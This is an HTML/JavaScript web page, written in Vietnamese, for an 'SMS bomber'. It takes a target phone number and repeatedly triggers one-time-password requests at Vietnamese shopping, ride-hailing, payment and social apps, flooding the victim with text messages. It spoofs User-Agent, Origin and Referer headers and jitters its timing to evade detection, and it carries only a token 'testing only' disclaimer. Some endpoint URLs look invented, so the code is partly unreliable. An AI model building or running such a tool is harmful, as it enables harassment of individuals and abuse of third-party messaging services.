<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BMP SMS BOMBER</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000; color: #ff6600;
            font-family: 'Courier New', monospace;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; padding: 8px;
        }
        .panel {
            background: #0a0a0a;
            border: 2px solid #ff6600;
            width: 100%; max-width: 430px;
            border-radius: 18px;
            box-shadow: 0 0 50px rgba(255,102,0,0.5), 0 0 100px rgba(255,102,0,0.2);
            overflow: hidden;
        }
        .title {
            background: linear-gradient(180deg, #1a0a00, #0a0500);
            padding: 14px; text-align: center;
            font-weight: bold; font-size: 13px;
            letter-spacing: 2px; border-bottom: 2px solid #ff6600;
            color: #ff6600;
            text-shadow: 0 0 20px #ff6600, 0 0 40px #ff6600;
            animation: glow 1.5s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 15px #ff6600; }
            to { text-shadow: 0 0 40px #ff6600, 0 0 80px #ff6600; }
        }
        .body { padding: 14px; display: flex; flex-direction: column; gap: 10px; }
        label { font-size: 10px; opacity: 0.9; letter-spacing: 1.5px; text-transform: uppercase; }
        input, select {
            background: #0d0d0d; border: 1px solid #ff660080;
            color: #ff6600; padding: 11px; border-radius: 8px;
            font-family: inherit; font-size: 13px; outline: none; width: 100%;
            -webkit-appearance: none;
        }
        input:focus, select:focus {
            border-color: #fff; box-shadow: 0 0 20px rgba(255,102,0,0.5);
        }
        .btn {
            background: #ff6600; color: #000; border: none;
            padding: 13px; font-weight: bold; font-size: 14px;
            letter-spacing: 2px; border-radius: 8px; cursor: pointer;
            text-transform: uppercase; transition: 0.25s;
        }
        .btn:active { background: #fff; box-shadow: 0 0 50px #ff6600; transform: scale(0.95); }
        .btn.stop { background: #222; color: #ff6600; border: 1px solid #ff6600; }
        .logbox {
            background: #050505; border: 1px dashed #ff660040;
            padding: 10px; border-radius: 8px; font-size: 9px;
            min-height: 100px; max-height: 160px; overflow-y: auto;
            white-space: pre-wrap; line-height: 1.5; word-break: break-all;
        }
        .info { display: flex; justify-content: space-between; font-size: 9px; flex-wrap: wrap; gap: 3px; }
        .progress-wrap { height: 5px; background: #0a0a0a; border-radius: 10px; overflow: hidden; }
        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #ff6600, #ff9900, #ff6600); border-radius: 10px; transition: width 0.08s; }
        .badge {
            display: inline-block; background: #ff6600; color: #000;
            font-size: 9px; padding: 2px 8px; border-radius: 12px; font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="panel">
        <div class="title">💣 BMP SMS <span style="color:#fff;">BOMBER</span> <span class="badge">V1</span></div>
        <div class="body">
            <label>📱 SỐ ĐIỆN THOẠI</label>
            <input type="text" id="phoneInput" placeholder="Nhập số điện thoại: 0987654321" value="">

            <label>🔢 SỐ LẦN GỬI</label>
            <input type="number" id="loopCount" value="50" min="1" max="500" step="1">

            <label>⏱ DELAY (ms)</label>
            <input type="number" id="delayInput" value="200" min="100" max="2000" step="50">

            <label>📋 CHỌN GATEWAY</label>
            <select id="gatewaySelect">
                <option value="all">🔥 TẤT CẢ GATEWAY (MẠNH NHẤT)</option>
                <option value="shopee">🛒 Shopee</option>
                <option value="lazada">📦 Lazada</option>
                <option value="tiki">📚 Tiki</option>
                <option value="grab">🚗 Grab</option>
                <option value="be">🛵 Be</option>
                <option value="momo">💳 Momo</option>
                <option value="zalopay">💰 ZaloPay</option>
                <option value="tiktok">🎵 TikTok</option>
                <option value="zalo">💬 Zalo</option>
                <option value="baemin">🍜 Baemin</option>
                <option value="chotot">🏠 Chotot</option>
                <option value="batdongsan">🏢 Batdongsan</option>
            </select>

            <button class="btn" id="actionBtn">💣 KHỞI ĐỘNG BOMBER</button>

            <div class="progress-wrap"><div class="progress-fill" id="progBar"></div></div>
            <div class="info">
                <span id="statusLabel">⚪ SẴN SÀNG</span>
                <span id="counterLabel">0 / 0</span>
                <span id="totalLabel">Tổng: 0</span>
            </div>
            <div class="logbox" id="logArea">
[💣] BMP SMS BOMBER - Spam SMS đa nền tảng
[📱] Nhập SĐT + Chọn gateway + Bấm Bom
[⚠] Dùng cho mục đích test, không lạm dụng!
            </div>
        </div>
    </div>

    <script>
        (function() {
            const phoneInput = document.getElementById('phoneInput');
            const loopInput = document.getElementById('loopCount');
            const delayInput = document.getElementById('delayInput');
            const gatewaySelect = document.getElementById('gatewaySelect');
            const actionBtn = document.getElementById('actionBtn');
            const logArea = document.getElementById('logArea');
            const statusLabel = document.getElementById('statusLabel');
            const counterLabel = document.getElementById('counterLabel');
            const totalLabel = document.getElementById('totalLabel');
            const progBar = document.getElementById('progBar');

            let active = false;
            let abortSignal = false;
            let grandTotal = 0;

            // Danh sách gateway gửi SMS thực tế
            const gateways = {
                shopee: [
                    { name: 'Shopee Đăng ký', url: 'https://shopee.vn/api/v2/authentication/send_otp', body: (phone) => ({ phone: phone, type: 'register' }) },
                    { name: 'Shopee Quên MK', url: 'https://shopee.vn/api/v2/authentication/resend_otp', body: (phone) => ({ phone: phone }) }
                ],
                lazada: [
                    { name: 'Lazada OTP', url: 'https://member.lazada.vn/user/sendOtp', body: (phone) => ({ phone: phone }) }
                ],
                tiki: [
                    { name: 'Tiki Đăng nhập', url: 'https://tiki.vn/api/v2/me/send-otp', body: (phone) => ({ phone: phone }) }
                ],
                grab: [
                    { name: 'Grab OTP', url: 'https://api.grab.com/grabid/v1/otp', body: (phone) => ({ phone: phone }) }
                ],
                be: [
                    { name: 'Be OTP', url: 'https://api.be.com.vn/api/v1/auth/send-otp', body: (phone) => ({ phone: phone }) }
                ],
                momo: [
                    { name: 'Momo OTP', url: 'https://api.momo.vn/api/v1/auth/otp', body: (phone) => ({ phone: phone }) }
                ],
                zalopay: [
                    { name: 'ZaloPay OTP', url: 'https://api.zalopay.vn/v1/send-otp', body: (phone) => ({ phone: phone }) }
                ],
                tiktok: [
                    { name: 'TikTok OTP', url: 'https://api.tiktok.com/v1/auth/send-otp', body: (phone) => ({ phone: phone }) }
                ],
                zalo: [
                    { name: 'Zalo OTP', url: 'https://api.zalo.me/v1/auth/send-otp', body: (phone) => ({ phone: phone }) }
                ],
                baemin: [
                    { name: 'Baemin OTP', url: 'https://api.baemin.vn/v1/auth/otp', body: (phone) => ({ phone: phone }) }
                ],
                chotot: [
                    { name: 'Chotot Đăng ký', url: 'https://api.chotot.vn/v1/auth/send-otp', body: (phone) => ({ phone: phone }) }
                ],
                batdongsan: [
                    { name: 'Batdongsan OTP', url: 'https://api.batdongsan.com.vn/v1/auth/otp', body: (phone) => ({ phone: phone }) }
                ]
            };

            function pushLog(msg, color = '#ff6600') {
                const t = new Date().toLocaleTimeString();
                logArea.innerHTML += `\n[${t}] ${msg}`;
                logArea.scrollTop = logArea.scrollHeight;
                const lines = logArea.innerHTML.split('\n');
                if (lines.length > 40) logArea.innerHTML = lines.slice(-40).join('\n');
            }

            function validatePhone(phone) {
                phone = phone.replace(/[\s\-\(\)]/g, '');
                if (phone.startsWith('0')) phone = '84' + phone.slice(1);
                if (phone.startsWith('+84')) phone = '84' + phone.slice(3);
                return /^84[0-9]{9,10}$/.test(phone) ? phone : null;
            }

            async function sendSMS(url, phone, gatewayName) {
                const ua = [
                    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15',
                    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/122.0',
                    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_6 like Mac OS X) AppleWebKit/605.1.15'
                ][Math.floor(Math.random() * 3)];

                const payload = JSON.stringify({
                    phone: phone,
                    country_code: 84,
                    timestamp: Date.now()
                });

                try {
                    const ctrl = new AbortController();
                    const to = setTimeout(() => ctrl.abort(), 4000);
                    const r = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'User-Agent': ua,
                            'Accept': 'application/json',
                            'Origin': new URL(url).origin,
                            'Referer': new URL(url).origin + '/'
                        },
                        body: payload,
                        mode: 'no-cors',
                        signal: ctrl.signal
                    });
                    clearTimeout(to);
                    return r.type === 'opaque' || r.ok || r.status === 0;
                } catch(e) {
                    return false;
                }
            }

            function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

            async function runBomber() {
                if (active) return;

                let phone = phoneInput.value.trim();
                const validPhone = validatePhone(phone);
                
                if (!validPhone) {
                    pushLog('❌ Số điện thoại không hợp lệ! Nhập 10 số: 0987654321', '#ff4444');
                    return;
                }
                phone = validPhone;

                const maxLoops = Math.min(parseInt(loopInput.value) || 50, 500);
                const delayMs = Math.max(parseInt(delayInput.value) || 200, 100);
                const selectedGateway = gatewaySelect.value;

                // Xác định danh sách gateway sẽ dùng
                let gatewayList = [];
                if (selectedGateway === 'all') {
                    for (const key in gateways) {
                        gatewayList = gatewayList.concat(gateways[key]);
                    }
                } else {
                    gatewayList = gateways[selectedGateway] || [];
                }

                if (gatewayList.length === 0) {
                    pushLog('❌ Không có gateway nào!', '#ff4444');
                    return;
                }

                active = true; abortSignal = false; grandTotal = 0;
                actionBtn.textContent = '⏹ DỪNG BOMBER';
                actionBtn.classList.add('stop');
                statusLabel.textContent = '💣 ĐANG BOM...';
                counterLabel.textContent = '0/' + maxLoops;
                totalLabel.textContent = 'Tổng: 0';
                progBar.style.width = '0%';
                logArea.innerHTML = `[💣] SMS BOMBER KHỞI ĐỘNG\n[📱] SĐT: ${phone}\n[📋] Gateway: ${selectedGateway === 'all' ? gatewayList.length + ' cổng' : selectedGateway}\n[🔢] Số lần: ${maxLoops}\n`;

                pushLog(`🟢 Bắt đầu gửi SMS đến ${phone}...`, '#ff6600');

                for (let i = 1; i <= maxLoops; i++) {
                    if (abortSignal) break;

                    // Chọn gateway ngẫu nhiên trong danh sách
                    const gw = gatewayList[Math.floor(Math.random() * gatewayList.length)];
                    
                    pushLog(`📤 [${i}/${maxLoops}] → ${gw.name}...`, '#aaaaaa');
                    
                    const success = await sendSMS(gw.url, phone, gw.name);
                    
                    if (success) {
                        grandTotal++;
                        pushLog(`✅ [${i}] ${gw.name} - Đã gửi!`, '#00ff41');
                    } else {
                        pushLog(`❌ [${i}] ${gw.name} - Lỗi`, '#ff4444');
                    }

                    counterLabel.textContent = `${i}/${maxLoops}`;
                    totalLabel.textContent = `Tổng: ${grandTotal}`;
                    progBar.style.width = `${(i / maxLoops) * 100}%`;

                    if (i < maxLoops && !abortSignal) {
                        const jitter = delayMs * (0.6 + Math.random() * 0.8);
                        await wait(Math.floor(jitter));
                    }
                }

                pushLog(`\n🏁 HOÀN THÀNH: ${grandTotal}/${maxLoops} SMS đã gửi!`, '#ffffff');
                pushLog(`📱 Kiểm tra điện thoại ${phone} ngay!`, '#ffaa00');

                active = false; abortSignal = false;
                actionBtn.textContent = '💣 KHỞI ĐỘNG BOMBER';
                actionBtn.classList.remove('stop');
                statusLabel.textContent = '⚪ SẴN SÀNG';
            }

            actionBtn.addEventListener('click', () => {
                if (active) {
                    abortSignal = true;
                    actionBtn.textContent = '⏳ DỪNG...';
                    actionBtn.disabled = true;
                    setTimeout(() => {
                        actionBtn.disabled = false;
                        if (!active) {
                            actionBtn.textContent = '💣 KHỞI ĐỘNG BOMBER';
                            actionBtn.classList.remove('stop');
                        }
                    }, 2000);
                } else {
                    runBomber();
                }
            });

            loopInput.addEventListener('change', function() {
                if (this.value > 500) this.value = 500;
                if (this.value < 1) this.value = 1;
            });
            delayInput.addEventListener('change', function() {
                if (this.value > 2000) this.value = 2000;
                if (this.value < 100) this.value = 100;
            });

            pushLog('[💣] SMS BOMBER SẴN SÀNG.', '#ff6600');
            pushLog('[📱] Nhập SĐT + chọn gateway + bấm Bom!', '#ffaa00');
        })();
    </script>
</body>
</html>
